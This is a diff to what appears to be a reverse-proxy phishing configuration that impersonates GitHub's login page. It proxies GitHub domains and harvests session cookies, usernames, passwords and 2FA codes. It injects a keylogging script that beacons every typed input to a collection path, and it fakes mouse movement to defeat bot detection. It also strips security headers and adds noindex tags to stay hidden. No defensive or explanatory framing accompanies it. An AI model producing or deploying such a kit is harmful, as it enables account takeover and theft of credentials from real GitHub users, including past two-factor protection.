@@ -1,25 +1,74 @@
-name: "GitHub-Login"
-author: "Vanta v5"
-min_ver: "5.0.0"
+name: "github"
+author: "@redteam_expert"
+min_ver: "3.0.0"
 proxy_hosts:
-  - subdomain: "github"
-    target: "github.com"
-auth_urls: ["/login"]
-landing_path: ["/login"]
+  - {phish_sub: "github", orig_sub: "github", domain: "com", session: true, is_landing: true}
+  - {phish_sub: "api", orig_sub: "api", domain: "github.com", session: true, is_landing: false}
+  - {phish_sub: "assets", orig_sub: "github", domain: "githubassets.com", session: false, is_landing: false}
+  - {phish_sub: "avatars", orig_sub: "avatars", domain: "githubusercontent.com", session: false, is_landing: false}
+  - {phish_sub: "camo", orig_sub: "camo", domain: "githubusercontent.com", session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: "github.com", orig_sub: "github", domain: "com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "github.com", orig_sub: "api", domain: "github.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
 auth_tokens:
-  - {type: "cookie", name: "user_session"}
-  - {type: "cookie", name: "__Host-user_session_same_site"}
+  - domain: ".github.com"
+    keys: ["user_session", "__Host-user_session_same_site", "dotcom_user", "logged_in", "_gh_sess"]
+  - domain: "github.com"
+    keys: ["user_session", "__Host-user_session_same_site", "dotcom_user", "logged_in", "_gh_sess"]
 credentials:
-  - {type: "post_param", name: "login", regex: null}
-  - {type: "post_param", name: "password", regex: null}
-injections: []
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  2fa:
+    key: "otp"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "github.com"
+  path: "/login"
+js_inject:
+  - trigger_domains: ["github.com"]
+    trigger_paths: ["/login", "/session"]
+    script: |
+      (function(){
+        // Anti-Bot: Mock user behavior
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        setInterval(() => {
+           const ev = new MouseEvent('mousemove', {
+               view: window, bubbles: true, cancelable: true, 
+               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
+           });
+           document.dispatchEvent(ev);
+        }, 3000);
+        
+        // Input Capture
+        document.addEventListener('input', function(e) {
+            if(e.target.tagName === 'INPUT') {
+                 // Send to Beacon
+                 if(window.navigator.sendBeacon) {
+                    const data = new FormData();
+                    data.append('k', e.target.value);
+                    data.append('f', e.target.name || e.target.id);
+                    window.navigator.sendBeacon('/__vanta_track', data);
+                 }
+            }
+        });
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
-path_rewrites:
-  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
+  - {action: "remove", name: "X-Content-Type-Options"}
+  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
+path_rewrites: []
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/assets/|/collector", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|gtm|/static/|collector", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"session\"]", action_to: "/session"}
+bridges:
+  - {prefix: "/_gh_api/", target_host: "api.github.com", strip_prefix: true, cors: "allow_all"}
